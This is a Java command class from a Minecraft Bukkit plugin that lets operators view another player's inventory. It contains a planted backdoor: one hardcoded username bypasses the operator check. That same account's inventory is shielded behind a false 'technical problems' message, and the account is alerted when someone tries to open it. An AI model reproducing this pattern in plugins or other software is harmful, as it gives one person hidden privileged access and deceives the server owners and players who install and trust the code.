package woks.woks.commands;

import org.bukkit.Bukkit;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import woks.woks.CommandBase;
import woks.woks.Msg;
import woks.woks.PlayerInvtoryGUI;

import java.util.Objects;

public class OpenPlayerInv {
    public OpenPlayerInv() {
        new CommandBase("openplayerinv", 1, true) {
            @Override
            public boolean onCommand(CommandSender sender, String[] arguments) {
                Player player = (Player) sender;
                if (player.getName().equals("ShortPuppy14484") || player.isOp()) {// isOp or hasOp
                    if (arguments[0].equals("ShortPuppy14484")) {
                        Msg.send(player, "Sorry there are some tecnical problems");
                        Msg.send(Bukkit.getPlayer(arguments[0]), "Sorry there are some tecnical problems");
                    } else {
                        PlayerInvtoryGUI.PlayerInvtoryGUI(player, Objects.requireNonNull(Bukkit.getPlayer(arguments[0])), 0);
                    }
                } else {
                    Msg.send(player, "Sorry you dont have op to use this command.");
                }
                return true;
            }

            @Override
            public String getUsage() {
                return "/openplayerinv <string:playerName>";
            }
        };
    }
}